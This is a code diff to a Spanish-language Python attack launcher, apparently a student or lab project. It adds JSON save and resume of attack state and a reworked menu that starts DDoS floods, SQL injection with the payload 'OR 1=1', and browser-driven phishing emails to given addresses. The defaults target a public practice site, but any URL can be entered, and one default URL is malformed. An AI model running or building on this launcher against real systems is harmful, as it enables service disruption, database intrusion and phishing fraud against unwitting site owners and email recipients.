@@ -12,6 +12,7 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 import subprocess
+import json
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -170,42 +171,129 @@ class PhishingAttack(Attack):
         self.driver.quit()
         print("Ataque de phishing detenido.")
 
+def save_attack_state(attack: Attack) -> None:
+    attack_data = {
+        "type": attack.get_attack_type().value,
+        "status": attack.status,
+        "targets": attack.get_targets(),
+        "params": {}
+    }
+    if isinstance(attack, DDoSAttack):
+        attack_data["params"] = {
+            "dst_url": attack.dst_url,
+            "n_ips": attack.n_ips,
+            "n_msg": attack.n_msg,
+            "threads": attack.threads
+        }
+    elif isinstance(attack, SQLInjectionAttack):
+        attack_data["params"] = {
+            "target_url": attack._SQLInjectionAttack__target_url,
+            "payload": attack._SQLInjectionAttack__payload
+        }
+    elif isinstance(attack, PhishingAttack):
+        attack_data["params"] = {
+            "target_emails": attack._PhishingAttack__target_emails,
+            "template": attack._PhishingAttack__template
+        }
+    
+    with open("./ataques/attack_state.json", "w") as file:
+        json.dump(attack_data, file, indent=4)
+    print(f"Estado del ataque guardado: {attack_data}")
+
+
+def load_attack_state() -> Attack:
+    try:
+        with open("./ataques/attack_state.json", "r") as file:
+            attack_data = json.load(file)
+            attack_type = AttackType(attack_data["type"])
+            status = attack_data["status"]
+            targets = attack_data["targets"]
+
+            if attack_type == AttackType.DDoS:
+                return DDoSAttack(
+                    target_url=targets[0],
+                    n_ips=attack_data["params"]["n_ips"],
+                    n_msg=attack_data["params"]["n_msg"],
+                    threads=attack_data["params"]["threads"]
+                )
+            elif attack_type == AttackType.SQL_INJECTION:
+                return SQLInjectionAttack(
+                    target_url=targets[0],
+                    payload=attack_data["params"]["payload"]
+                )
+            elif attack_type == AttackType.PHISHING:
+                return PhishingAttack(
+                    target_emails=attack_data["params"]["target_emails"],
+                    template=attack_data["params"]["template"]
+                )
+    except (FileNotFoundError, json.JSONDecodeError):
+        print("No se encontró un estado guardado o hubo un error al cargarlo.")
+        return None
+
+
 if __name__ == '__main__':
-    while True:
-        print("\nSeleccione el tipo de ataque a ejecutar:")
-        print("1. DDoS Attack")
-        print("2. SQL Injection Attack")
-        print("3. Phishing Attack")
-        print("4. Salir")
-        
-        choice = input("Ingrese el número de su elección: ")
+    attack = load_attack_state()
 
-        #? DDoS
-        if choice == '1':
+    if attack:
+        print(f"Se encontró un ataque guardado de tipo {attack.get_attack_type().value} con estado {attack.status}.")
+        resume = input("¿Deseas reanudar este ataque? (y/n): ")
+        if resume.lower() == 'y':
+            if attack.status == "running":
+                print(f"El ataque ya está en curso.")
+            elif attack.status == "paused":
+                attack.start()
+            elif attack.status == "stopped":
+                print("El ataque fue detenido anteriormente. Elige un nuevo ataque.")
+            else:
+                print("Estado del ataque desconocido.")
+        else:
+            attack = None
+
+    # Si no se carga un ataque guardado o el usuario decide no reanudarlo
+    if not attack:
+        def initDDoS() -> None:
             target_url = input("Ingrese la URL de destino para el ataque DDoS (default: http://testphp.vulnweb.com): ") or "http://testphp.vulnweb.com"
-
             n_ips = input("Ingrese el número de IPs (default: 10): ") or 10
             n_msg = input("Ingrese el número de mensajes por IP (default: 5): ") or 5
             threads = input("Ingrese el número de hilos (default: 4): ") or 4
             ddos_attack = DDoSAttack(target_url, int(n_ips), int(n_msg), int(threads))
             ddos_attack.start()
+            save_attack_state(ddos_attack)
 
-        #? 
-        elif choice == '2':
-            target_url = input("Ingrese la URL para el ataque SQL Injection (default: generic url): ") or "http://testphp.vulnweb.com/showimage.php?file=1"
-
+        def initSQL() -> None:
+            target_url = input("Ingrese la URL para el ataque SQL Injection (default: generic url): ") or "http:testphp.vulnweb.com/showimage.php?file=1"
             payload = input('Ingrese el payload (default: OR 1=1): ') or 'OR 1=1'
             sql_injection_attack = SQLInjectionAttack(target_url, payload)
             sql_injection_attack.start()
-        elif choice == '3':
+            save_attack_state(sql_injection_attack)
+
+        def initPhishing() -> None:
             target_emails = input("Ingrese los correos electrónicos de destino separados por comas (default: correos predefinidos): ") or "manelguvi100@gmail.com,manelguvi200@gmail.com"
-
             template = input("Ingrese la plantilla del correo de phishing (default: Este es un correo de phishing. Por favor, haga clic en el enlace malvado D): ") or "Este es un correo de phishing. Por favor, haga clic en el enlace malvado D:"
-
             phishing_attack = PhishingAttack(target_emails.split(','), template)
             phishing_attack.start()
-        elif choice == '4':
-            print("Saliendo...")
-            break
-        else:
-            print("Opción no válida. Por favor, intente de nuevo.")
+            save_attack_state(phishing_attack)
+
+        while True:
+            print("\nSeleccione el tipo de ataque a ejecutar:")
+            print("1. DDoS Attack")
+            print("2. SQL Injection Attack")
+            print("3. Phishing Attack")
+            print("4. Salir")
+
+            choice = input("Ingrese el número de su elección: ")
+            #? DDoS
+            if choice == '1':
+                initDDoS()
+            #? SQL
+            elif choice == '2':
+                initSQL()
+            #? Phising
+            elif choice == '3':
+                initPhishing()
+
+            elif choice == '4':
+                print("Saliendo...")
+                break
+            else:
+                print("Opción no válida. Por favor, intente de nuevo.")
